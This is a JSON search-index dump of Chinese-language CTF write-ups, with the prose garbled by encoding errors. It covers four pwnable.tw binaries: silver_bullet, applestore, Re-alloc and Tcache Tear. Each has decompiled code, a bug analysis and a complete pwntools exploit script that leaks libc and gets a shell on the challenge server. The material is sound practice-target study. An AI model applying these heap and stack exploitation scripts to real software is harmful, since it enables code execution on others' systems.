10","uri":"/challenges-100-week-10/#challenges_100-week_10"},{"categories":["Writeups"],"content":"silver_bullet","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#silver_bullet"},{"categories":["Writeups"],"content":"checksec Arch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksec"},{"categories":["Writeups"],"content":"IDAcreate int __cdecl create_bullet(char *s) { size_t v2; // [esp+0h] [ebp-4h] if ( *s ) return puts(\"You have been created the Bullet !\"); printf(\"Give me your description of bullet :\"); read_input(s, 0x30u); v2 = strlen(s); printf(\"Your power is : %u\\n\", v2); *((_DWORD *)s + 12) = v2; return puts(\"Good luck !!\"); } power_up int __cdecl power_up(char *dest) { char s[48]; // [esp+0h] [ebp-34h] BYREF size_t v3; // [esp+30h] [ebp-4h] v3 = 0; memset(s, 0, sizeof(s)); if ( !*dest ) return puts(\"You need create the bullet first !\"); if ( *((_DWORD *)dest + 12) \u003e 0x2Fu ) return puts(\"You can't power up any more !\"); printf(\"Give me your another description of bullet :\"); read_input(s, 48 - *((_DWORD *)dest + 12)); strncat(dest, s, 48 - *((_DWORD *)dest + 12)); v3 = strlen(s) + *((_DWORD *)dest + 12); printf(\"Your new power is : %u\\n\", v3); *((_DWORD *)dest + 12) = v3; return puts(\"Enjoy it !\"); } æˆ‘å°è¯•è¿è¡Œç¨‹åºï¼Œè¾“å…¥å‡ ä¸ªåƒåœ¾æ•°æ®ï¼Œå‘ç°åœ¨power_upä¸­ï¼Œèƒ½è¦†ç›–é•¿åº¦ï¼Œä»è€Œå¾—åˆ°ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œä»è€Œåœ¨beatä¸­æ­£å¸¸é€€å‡ºç¨‹åºæ‰§è¡ŒROPã€‚ æ‰€ä»¥æ¼æ´ç‚¹åœ¨power_upä¸­ã€‚è¿™é‡Œåœ¨strncatåœ¨æ‹¼æ¥å­—ç¬¦ä¸²åï¼Œä¼šåœ¨æœ€ååŠ â€\\x00â€œè¿›è¡Œæˆªæ–­ï¼Œå¯ä»¥è¦†ç›–å¤§å°ï¼Œäº§ç”Ÿæ ˆæº¢å‡ºã€‚ ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name,hex(addr))) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./silver_bullet' #gdb.attach(p) if local: p=process(binary) else: p=remote('chall.pwnable.tw',10103) elf = ELF(binary,checksec=False) libc = ELF('./libc_32.so.6',checksec=False) puts_plt = elf.plt['puts'] read_got = elf.got['read'] #gdb.attach(p) one = [0x3a819, 0x5f065, 0x5f066] #create p.sendlineafter('Your choice :',\"1\") payload='a'*47 p.sendlineafter('Give me your description of bullet :',payload) #power up p.sendlineafter('Your choice :',\"2\") payload='a' p.sendlineafter('Give me your another description of bullet :',payload) p.sendlineafter('Your choice :',\"2\") payload='\\xff'*7+p32(puts_plt)+p32(0x8048954)+p32(read_got) p.sendlineafter('Give me your another description of bullet :',payload) p.sendlineafter('Your choice :',\"3\") read_addr = u32(p.recvuntil('\\xf7')[-4:]) leak('read',read_addr) libcbase= read_addr-libc.sym['read'] one_gedget = libcbase+one[0] p.sendlineafter('Your choice :',\"1\") payload='a'*47 p.sendlineafter('Give me your description of bullet :',payload) #power up p.sendlineafter('Your choice :',\"2\") payload='a' p.sendlineafter('Give me your another description of bullet :',payload) p.sendlineafter('Your choice :',\"2\") payload='\\xff'*7+p32(one_gedget) p.sendlineafter('Give me your another description of bullet :',payload) p.sendlineafter('Your choice :',\"3\") p.interactive() ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp"},{"categories":["Writeups"],"content":"pwnable.tw-applestore","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#pwnabletw-applestore"},{"categories":["Writeups"],"content":"checksec Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksec-1"},{"categories":["Writeups"],"content":"IDAhandler unsigned int handler() { char nptr[22]; // [esp+16h] [ebp-22h] BYREF unsigned int v2; // [esp+2Ch] [ebp-Ch] v2 = __readgsdword(0x14u); while ( 1 ) { printf(\"\u003e \"); fflush(stdout); my_read(nptr, 0x15u); switch ( atoi(nptr) ) { case 1: list();//åˆ—å‡ºå•†å“èœå•ï¼Œuseless break; case 2: add();//å‘é“¾è¡¨ä¸­æ·»åŠ ä¸€ä¸ªå•†å“ break; case 3: delete();//ä»é“¾è¡¨ä¸­åˆ é™¤ä¸€ä¸ªå•†å“ break; case 4: cart();//åˆ—å‡ºé“¾è¡¨ä¸­æ‰€æœ‰çš„å•†å“ break; case 5: checkout(); break; case 6: puts(\"Thank You for Your Purchase!\"); return __readgsdword(0x14u) ^ v2; default: puts(\"It's not a choice! Idiot.\"); break; } } } add unsigned int add() { const char **v1; // [esp+1Ch] [ebp-2Ch] char nptr[22]; // [esp+26h] [ebp-22h] BYREF unsigned int v3; // [esp+3Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Device Number\u003e \"); fflush(stdout); my_read(nptr, 0x15u); switch ( atoi(nptr) ) { case 1: v1 = (const char **)create(\"iPhone 6\", 199); insert(v1); goto LABEL_8; case 2: v1 = (const char **)create(\"iPhone 6 Plus\", 299); insert(v1); goto LABEL_8; case 3: v1 = (const char **)create(\"iPad Air 2\", 499); insert(v1); goto LABEL_8; case 4: v1 = (const char **)create(\"iPad Mini 3\", 399); insert(v1); goto LABEL_8; case 5: v1 = (const char **)create(\"iPod Touch\", 199); insert(v1); LABEL_8: printf(\"You've put *%s* in your shopping cart.\\n\", *v1); puts(\"Brilliant! That's an amazing idea.\"); break; default: puts(\"Stop doing that. Idiot!\"); break; } return __readgsdword(0x14u) ^ v3; } create char **__cdecl create(const char *a1, char *a2) { char **v3; // [esp+1Ch] [ebp-Ch] v3 = (char **)malloc(0x10u); v3[1] = a2; asprintf(v3, \"%s\", a1); v3[2] = 0; v3[3] = 0; return v3; } ç”³è¯·äº†0x10å¤§å°çš„ç©ºé—´ï¼Œä½¿ç”¨asprintfç”³è¯·å•†å“åç§°æ‰€å ç”¨å¤§å°çš„å†…å­˜ç©ºé—´ï¼Œå¹¶è¿”å›æŒ‡é’ˆã€‚asprintfæ‰€ç”³è¯·çš„å†…å­˜ç©ºé—´éœ€è¦æ‰‹åŠ¨é‡Šæ”¾ã€‚åœ¨32ä½ç¨‹åºä¸‹ï¼Œä¸€ä¸ªæŒ‡é’ˆå 4å­—èŠ‚ï¼Œç´§æ¥ç€çš„å››ä¸ªå­—èŠ‚æ”¾å…¥äº†å•†å“çš„ä»·æ ¼ï¼Œintç±»å‹ä¹Ÿæ˜¯å››ä¸ªå­—èŠ‚ï¼Œå…¶ä½™çš„0x8å­—èŠ‚éƒ½ç½®ä½0ã€‚ insert int __cdecl insert(int a1) { int result; // eax _DWORD *i; // [esp+Ch] [ebp-4h] for ( i = \u0026myCart; i[2]; i = (_DWORD *)i[2] ) ; i[2] = a1; result = a1; *(_DWORD *)(a1 + 12) = i; return result; } 0x10çš„ç©ºé—´åœ¨createçš„æ—¶å€™åªä½¿ç”¨äº†0x8ï¼Œåœ¨insertä¸­ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªå¾ªç¯ï¼Œè¿™ä¸ªå¾ªç¯æ˜¯ç”¨æ¥éå†é“¾è¡¨çš„ã€‚åœ¨åˆå§‹æ—¶ï¼ŒmyCartä¸ºç©ºï¼Œç›´æ¥è·³å‡ºäº†å¾ªç¯ï¼Œä¹‹ååœ¨å…¶+8çš„ä½ç½®æ”¾å…¥äº†å°†æ’å…¥çš„å•†å“çš„åœ°å€ï¼Œåˆåœ¨å•†å“å†…å­˜çš„+12çš„ä½ç½®æ’å…¥äº†myCartçš„åœ°å€ã€‚ åˆ°è¿™é‡Œå°±å¾ˆæ¸…æ™°äº†ï¼Œç¨‹åºä½¿ç”¨äº†ä¸€ä¸ªåŒå‘é“¾è¡¨æ¥ç®¡ç†å•†å“ï¼Œå…¶å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š |chunk head | |name_addr | +0 |price | +4 |fd | +8 |bk | +12 delete unsigned int delete() { int v1; // [esp+10h] [ebp-38h] int v2; // [esp+14h] [ebp-34h] int v3; // [esp+18h] [ebp-30h] int v4; // [esp+1Ch] [ebp-2Ch] int v5; // [esp+20h] [ebp-28h] char nptr[22]; // [esp+26h] [ebp-22h] BYREF unsigned int v7; // [esp+3Ch] [ebp-Ch] v7 = __readgsdword(0x14u); v1 = 1; v2 = dword_804B070; printf(\"Item Number\u003e \"); fflush(stdout); my_read(nptr, 0x15u); v3 = atoi(nptr); while ( v2 ) { if ( v1 == v3 ) { v4 = *(_DWORD *)(v2 + 8); v5 = *(_DWORD *)(v2 + 12); if ( v5 ) *(_DWORD *)(v5 + 8) = v4; if ( v4 ) *(_DWORD *)(v4 + 12) = v5; printf(\"Remove %d:%s from your shopping cart.\\n\", v1, *(const char **)v2); return __readgsdword(0x14u) ^ v7; } ++v1; v2 = *(_DWORD *)(v2 + 8); } return __readgsdword(0x14u) ^ v7; } åˆ é™¤å‡½æ•°ï¼Œæ ¹æ®å•†å“çš„åºå·å°†å•†å“ä»é“¾è¡¨ä¸­åˆ é™¤ï¼ŒæŒ‡é’ˆçš„æ›´æ–°ä¹Ÿå¾ˆç®€å•ï¼š fd-\u003ebk = p-\u003ebk; bk-\u003efd = p-\u003efd; checkout unsigned int checkout(){ int v1; // [esp+10h] [ebp-28h] char *v2[5]; // [esp+18h] [ebp-20h] BYREF unsigned int v3; // [esp+2Ch] [ebp-Ch] v3 = __readgsdword(0x14u); v1 = cart(); if ( v1 == 7174 ) { puts(\"*: iPhone 8 - $1\"); asprintf(v2, \"%s\", \"iPhone 8\"); v2[1] = (char *)1; //v2 is in the stack !!! insert((int)v2); v1 = 7175; } printf(\"Total: $%d\\n\", v1); puts(\"Want to checkout? Maybe next time!\"); return __readgsdword(0x14u) ^ v3;} å½“å•†å“çš„æ€»ä»·æ ¼ä¸º7174æ—¶ï¼Œå°±ä¼šå°†iPhone 8åŠ å…¥é“¾è¡¨ã€‚ è¿™é‡Œæ³¨æ„iPhone 8çš„å†…å­˜ç©ºé—´æ˜¯åœ¨æ ˆä¸Šçš„ï¼v2å˜é‡åœ¨ebp-0x20çš„ä½ç½®ï¼Œè¿™ç‚¹å¾ˆé‡è¦ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œè°ƒç”¨è€…ä¼šå°†è¢«è°ƒå‡½æ•°çš„å‚æ•°å‹æ ˆï¼Œä¹‹åä¿å­˜æ ˆåº•çš„ä½ç½®ï¼Œå³ebpã€‚åœ¨è¢«è°ƒå‡½æ•°è¿”å›æ—¶ï¼Œå¹¶æ²¡æœ‰å¯¹æ ˆè¿›è¡Œæ¸…ç©ºï¼Œåªæ˜¯æ¢å¤äº†æ ˆçš„ä½ç½®ã€‚è€Œå…¶ä»–è¢«è°ƒå‡½æ•°è¿˜æœ‰å¯èƒ½ä¼šä½¿ç”¨æ ˆä¸Šçš„è¿™ä¸ªæ•°æ®ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬é€šè¿‡ä¸€äº›æ‰‹æ®µä¿®æ”¹äº†è¿™ä¸ªæ•°æ®ï¼Œå°±å¯èƒ½é€ æˆæ”»å‡»ï¼Œçœ‹headlerçš„å‡½æ•°è°ƒç”¨ã€‚ .text:08048C33 loc_8048C33: ; CODE XREF: handler+5Eâ†‘j.text:08048C33 ; DATA XREF: .rodata:jpt_8048C31â†“o.text:08048C33 call list ; jumptable 08048C31 case 1.text:08048C38 jmp short loc_8048C63.text:08048C3A ; ---------------------------------------------------------------------------.text:08048C3A.text:08048C3A loc_8048C3A: ; CODE XREF: handler+5Eâ†‘j.text:08048C3A ; DATA XREF: .rodat","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack import sys leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" context.terminal = ['tmux', 'splitw', '-h'] binary='./applestore' #gdb.attach(sh) if 'g' in sys.argv[1]: context.log_level=\"DEBUG\" if 'l' in sys.argv[1] and 'r' not in sys.argv[1]: log.info('Test in local...') sh=process(binary) if 'r' in sys.argv[1]: log.info('Attacking...') sh=remote('chall.pwnable.tw',10104) elf = ELF(binary,checksec=False) #libc = ELF('',checksec=False) puts_got = elf.got['puts'] atoi_got = elf.got['atoi'] mycart = 0x804B068 add = '2';delete='3';cart='4';checkout='5' def do(choice,payload): sh.sendlineafter('\u003e ',choice) sh.sendlineafter('\u003e',payload) for i in range(6): do(add,b'1') for i in range(20): do(add,b'2') do(checkout,b'y') #add iphone-8 payload= b'y\\x00'+p32(puts_got)+p32(0x1)+p32(mycart+8)+p32(1) do(cart,payload) sh.recvuntil('27: ') puts_addr=u32(sh.recv(4)) sh.recvuntil('28: ') heap_addr = u32(sh.recv(4)) leak('puts addr',puts_addr) leak('heap addr',heap_addr) libc = LibcSearcher('puts',puts_addr) libcbase = puts_addr - libc.dump('puts') leak('libc base',libcbase) system = libcbase+libc.dump('system') env = libcbase+libc.dump('environ') payload= b'y\\x00'+p32(env)+p32(0x1)+p32(mycart+8)+p32(1) do(cart,payload) sh.recvuntil('27: ') stack =u32(sh.recv(4)) leak('stack',stack) payload = b'27'+p32(env)+p32(0x1)+p32(atoi_got+0x22)+p32(stack - 0x100 - 0xc) do(delete,payload) sh.sendlineafter('\u003e ',p32(system)+b';/bin/sh') sh.interactive() ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-1"},{"categories":["Writeups"],"content":"pwnable.tw-Re-alloc","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#pwnabletw-re-alloc"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksec-2"},{"categories":["Writeups"],"content":"IDAadd int allocate() { _BYTE *v0; // rax unsigned __int64 v2; // [rsp+0h] [rbp-20h] unsigned __int64 size; // [rsp+8h] [rbp-18h] void *v4; // [rsp+18h] [rbp-8h] printf(\"Index:\"); v2 = read_long(); if ( v2 \u003e 1 || heap[v2] ) { LODWORD(v0) = puts(\"Invalid !\"); } else { printf(\"Size:\"); size = read_long(); if ( size \u003c= 0x78 ) { v4 = realloc(0LL, size); if ( v4 ) { heap[v2] = v4; printf(\"Data:\"); v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (unsigned int)size)); *v0 = 0; } else { LODWORD(v0) = puts(\"alloc error\"); } } else { LODWORD(v0) = puts(\"Too large!\"); } } return (int)v0; } edit int reallocate() { unsigned __int64 v1; // [rsp+8h] [rbp-18h] unsigned __int64 size; // [rsp+10h] [rbp-10h] void *v3; // [rsp+18h] [rbp-8h] printf(\"Index:\"); v1 = read_long(); if ( v1 \u003e 1 || !heap[v1] ) return puts(\"Invalid !\"); printf(\"Size:\"); size = read_long(); if ( size \u003e 0x78 ) return puts(\"Too large!\"); v3 = realloc((void *)heap[v1], size); if ( !v3 ) return puts(\"alloc error\"); heap[v1] = v3; printf(\"Data:\"); return read_input(heap[v1], (unsigned int)size); } free int rfree() { _QWORD *v0; // rax unsigned __int64 v2; // [rsp+8h] [rbp-8h] printf(\"Index:\"); v2 = read_long(); if ( v2 \u003e 1 ) { LODWORD(v0) = puts(\"Invalid !\"); } else { realloc((void *)heap[v2], 0LL); v0 = heap; heap[v2] = 0LL; } return (int)v0; } ç¨‹åºçš„å„ç§åŠŸèƒ½éƒ½æ˜¯ç”±reallocæ¥å®ç°çš„ã€‚reallocæœ‰ä¸¤ä¸ªå‚æ•°pträ¸sizeï¼š ptr == NULLï¼šå…¶ä¸mallocç­‰ä»· ptr != NULL: new size == old sizeï¼šç›´æ¥å°†ptrè¿”å›ã€‚ new size \u003c old sizeï¼šå°†ptrè¿›è¡Œåˆ†å‰²ï¼Œå‰©ä½™éƒ¨åˆ†è‹¥å¤§äºæœ€å°chunkçš„å¤§å°å°±ä¼šè¢«free new size \u003e old sizeï¼šè°ƒç”¨mallocç”³è¯·ä¸€å—æ–°çš„å†…å­˜ï¼Œæ‹·è´æ•°æ®åå°†old ptré‡Šæ”¾ new size == 0ï¼šä¸freeç­‰ä»· åœ¨editä¸­ï¼Œè‹¥new sizeä¸º0ï¼Œå°±ç›¸å½“äºå¯¹chunkè¿›è¡Œäº†freeï¼Œfreeçš„è¿”å›å€¼ä¸º0ã€‚ç¨‹åºè¿›è¡Œäº†è¿”å›ï¼Œæ²¡æœ‰å°†åŸæ¥çš„æŒ‡é’ˆè¿›è¡Œæ›´æ–°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›è¡ŒUAFã€‚ gotè¡¨å¯å†™ï¼Œä½†æ˜¯æ²¡æœ‰showå‡½æ•°ï¼Œå…ˆæƒ³åŠæ³•é€šè¿‡ä¿®æ”¹gotè¡¨è¿›è¡Œleakã€‚è®¡åˆ’ä¿®æ”¹atoll_gotä¸ºprintf_pltï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ¥æ³„éœ²gotè¡¨ä¸­çš„åœ°å€ï¼Œä»è€Œleak libcã€‚ é¦–å…ˆï¼Œç”³è¯·ä¸€ä¸ªchunkï¼Œä½¿ç”¨editå°†å…¶freeï¼Œå¹¶ä¿®æ”¹å…¶fdæŒ‡å‘atoll_gotã€‚ç„¶åï¼Œå†å°†è¿™ä¸ªchunkç”³è¯·å›æ¥ï¼Œè¿™æ—¶nextå°±ä¼šè¢«å¡«å…¥atoll_gotã€‚ä¸ºäº†ä¸å½±å“æœ€å¼€å§‹çš„è¿™ä¸ªtcache binï¼Œæˆ‘ä»¬reallocè¿™ä¸ªchunkï¼Œä¸ºä¸€ä¸ªæ–°å¤§å°ï¼Œç„¶åfreeæ‰ã€‚è¿™æ—¶ï¼Œè¿™ä¸ªchunkçš„keyè¢«æ¸…ç©ºäº†ï¼Œä½†æ˜¯heapæ•°ç»„ä¸­è¿˜æœ‰è¿™ä¸ªchunkçš„æŒ‡é’ˆï¼Œè€Œä¸”æˆ‘ä¹ˆæ²¡æ³•ç›´æ¥è¦†ç›–ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ¬¡é€šè¿‡reallocä¿®æ”¹å™¨keyåŸŸä¸ºåƒåœ¾æ•°æ®ï¼Œå°†å…¶freeå°±å¯ä»¥æ¸…ç©ºheapæ•°ç»„äº†ã€‚æœ€åï¼Œä¸€ä¸ªtcache binçš„nextä¸ä¸ºNULLä½†æ˜¯countä¸º0ï¼Œä¹‹åå†ç”³è¯·å¯¹åº”çš„å¤§å°å°±ä¼šè®©counté€ æˆæº¢å‡ºã€‚ åœ¨leak libcåï¼Œè¿˜è¦å†æ¬¡è¿›è¡Œä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ¬¡ä½¿ç”¨ä¸Šè¿°æ“ä½œï¼Œä½¿å¦ä¸€ä¸ªtcache binçš„nextæŒ‡å‘atoll_gotã€‚ ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * #from LibcSearcher import LibcSearcher from struct import pack import sys leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] binary='./re-alloc' #gdb.attach(sh) if 'l' in sys.argv[1] and 'r' not in sys.argv[1]: log.info('Test in local...') sh=process(binary) if 'r' in sys.argv[1]: log.info('Attacking...') sh=remote('chall.pwnable.tw', 10106) elf = ELF(binary,checksec=False) libc = ELF('libc.so',checksec=False) def add(idx,size,data): sh.sendlineafter('choice: ','1') sh.sendlineafter('Index:',str(idx)) sh.sendlineafter('Size:',str(size)) sh.sendafter('Data:',data) def edit(idx,size,data): sh.sendlineafter('choice: ','2') sh.sendlineafter('Index:',str(idx)) sh.sendlineafter('Size:',str(size)) if size != 0: sh.sendafter('Data:',data) def dele(idx): sh.sendlineafter('choice: ','3') sh.sendlineafter('Index:',str(idx)) atoll_got = elf.got['atoll'] printf_plt = elf.plt['printf'] add(0,0x18,'a'*0x8) edit(0,0,'') edit(0,0x18,p64(atoll_got)) add(1,0x18,'a'*0x8) edit(0,0x38,'a'*8) dele(0) edit(1,0x38,'b'*0x10) dele(1) add(0,0x48,'a'*0x8) edit(0,0,'') edit(0,0x48,p64(atoll_got)) add(1,0x48,'a'*0x8) edit(0,0x58,'a'*8) dele(0) edit(1,0x58,'b'*0x10) dele(1) add(0,0x48,p64(printf_plt)) sh.sendlineafter('choice: ','1') sh.recvuntil(\"Index:\") sh.sendline('%6$p') stdout_addr = int(sh.recv(14),16) libc.address=stdout_addr -libc.sym['_IO_2_1_stdout_'] info(\"libc: \"+hex(libc.address)) sh.sendlineafter('choice: ','1') sh.recvuntil(\":\") sh.sendline('a'+'\\x00') sh.recvuntil(\":\") sh.send('a'*15+'\\x00') sh.recvuntil(\"Data:\") sh.send(p64(libc.sym['system'])) # gdb.attach(p) sh.sendlineafter('choice: ','3') sh.recvuntil(\"Index:\") sh.sendline(\"/bin/sh\\x00\") sh.interactive() ç”±äºå»¶è¿ŸåŸå› ï¼ˆè¾£é¸¡æ ¡å›­ç½‘ï¼Œå»ºè®®ä½¿ç”¨sh.recvuntil('xxx');sh.send('xxx')è€Œä¸æ˜¯sendlineafterã€‚ ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-2"},{"categories":["Writeups"],"content":"pwnable.tw-Tcache Tear","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#pwnabletw-tcache-tear"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksec-3"},{"categories":["Writeups"],"content":"IDAadd int add() { unsigned __int64 v0; // rax int size; // [rsp+8h] [rbp-8h] printf(\"Size:\"); v0 = choice(); size = v0; if ( v0 \u003c= 0xFF ) { ptr = malloc(v0); printf(\"Data:\"); my_read((__int64)ptr, size - 16); LODWORD(v0) = puts(\"Done !\"); } return v0; } main void __fastcall __noreturn main(__int64 a1, char **a2, char **a3) { __int64 v3; // rax unsigned int v4; // [rsp+Ch] [rbp-4h] Init(a1, a2, a3); printf(\"Name:\"); my_read(\u0026name, 32LL); v4 = 0; while ( 1 ) { while ( 1 ) { menu(); v3 = choice(); if ( v3 != 2 ) break; if ( v4 \u003c= 7 ) { free(ptr); ++v4; } } if ( v3 \u003e 2 ) { if ( v3 == 3 ) { show(); } else { if ( v3 == 4 ) exit(0); LABEL_14: puts(\"Invalid choice\"); } } else { if ( v3 != 1 ) goto LABEL_14; add(); } } } show ssize_t show() { printf(\"Name :\"); return write(1, \u0026name, 0x20uLL); } æ¼æ´ç‚¹æœ‰ä¸¤ä¸ªåœ°æ–¹: freeåæŒ‡é’ˆæœªæ¸…é›¶ï¼Œå¯¹æœ¬é¢˜æ¥è¯´å¯ä»¥é€ æˆUAF åœ¨addå‡½æ•°ä¸­ï¼Œè‹¥size\u003c16ï¼Œåˆ™ä¼šæ•´æ•°æº¢å‡ºï¼Œå¯å†™å…¥ä»»æ„é•¿åº¦æ•°æ® gotè¡¨ä¸å¯å†™ï¼ŒåŒæ—¶ä¹Ÿæ²¡æœ‰è¾“å‡ºå‡½æ•°ï¼Œåªæœ‰å°†åå­—è¿›è¡Œè¾“å‡ºã€‚é¦–å…ˆï¼Œæƒ³åŠæ³•è¿›è¡Œleakï¼Œé€šè¿‡uafï¼Œæˆ‘ä»¬å¯ä»¥å¯¹ä»»æ„å·²çŸ¥åœ°å€çš„å†…å­˜è¿›è¡Œè¯»å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†nameæ‰€åœ¨çš„å†…å­˜ä¼ªé€ æˆä¸€ä¸ªlarge chunkï¼Œå°†å…¶freeï¼Œå†showå°±å¯ä»¥leak libcï¼Œä¹‹åå°±æ˜¯ç®€å•äº†ã€‚ ä¸ºäº†æˆåŠŸå°†large chunkè¿›è¡Œfreeï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸‰ä¸ªchunkï¼Œçœ‹ä¸‹é¢çš„è¿™æ®µä»£ç ï¼š nextsize = chunksize(nextchunk); if (__builtin_expect (chunksize_nomask (nextchunk) \u003c= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize \u003e= av-\u003esystem_mem, 0)) malloc_printerr (\"free(): invalid next size (normal)\"); Â·Â·Â· if (nextchunk != av-\u003etop) { /* get and clear inuse bit */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); è¯¥æ®µä»£ç æ£€æŸ¥freeçš„chunkçš„nextchunkå¤§å°æ˜¯å¦æ»¡è¶³è¦æ±‚ï¼Œè¿˜æ£€æŸ¥äº†nextchunkçš„inuseä½ï¼Œè¿™ä¸€ä½åœ¨nextchunkçš„nextchunkä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¼ªé€ ä¸‰ä¸ªchunkã€‚ é¦–å…ˆï¼Œå…ˆå°†ä¸¤ä¸ªnextchunkæ„é€ å‡ºæ¥ï¼Œåœ¨name+0x500çš„åœ°æ–¹ä¼ªé€ é€šè¿‡ä»»æ„åœ°å€è¯»å†™ä¼ªé€ ä¸¤ä¸ª0x20çš„chunkï¼Œä¹‹ååœ¨å°†nameçš„chunkå–å‡ºfreeæ‰ã€‚ ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-3"},{"categories":["Writeups"],"content":"exp from pwn import * # from LibcSearcher import LibcSearcher from struct import pack import sys leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" context.terminal = ['tmux', 'splitw', '-h'] binary='./tcache_tear' #gdb.attach(sh) if 'g' in sys.argv[1]: context.log_level=\"DEBUG\" if 'l' in sys.argv[1] and 'r' not in sys.argv[1]: log.info('Test in local...') sh=process(binary) if 'r' in sys.argv[1]: log.info('Attacking...') sh=remote('chall.pwnable.tw', 10207) elf = ELF(binary,checksec=False) libc = ELF('./libc.so',checksec=False) def add(size,data): sh.recvuntil('choice :') sh.sendline('1') sh.recvuntil('Size:') sh.send(str(size)) sh.recvuntil('Data:') sh.send(data) def free(): sh.recvuntil('choice :') sh.sendline('2') name = 0x602060 one = [0x4f2c5, 0x4f322,0x10a38c] sh.sendline(p64(0)+p64(0x501)) add(0x50,'a'*8+'\\n') # 0x100 free() free() add(0x50,p64(name+0x500)) add(0x50,'aaa') add(0x50,p64(0)+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)*2) add(0x60,'aaaa') free() free() add(0x60,p64(name+0x10)) add(0x60,'aaa') add(0x60,'a') free() # gdb.attach(sh) sh.recvuntil('choice :') sh.sendline('3') malloc_hook = u64(sh.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) - 96 - 0x10 libc.address = malloc_hook - libc.sym['__malloc_hook'] one_gadget = libc.address + one[1] leak('libc base',libc.address) add(0x70,'aaaa') free() free() add(0x70,p64(libc.sym['__free_hook'])) add(0x70,'aaa') add(0x70,p64(one_gadget)) free() sh.interactive() ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-3"},{"categories":["Writeups"],"content":"Lilac 2021 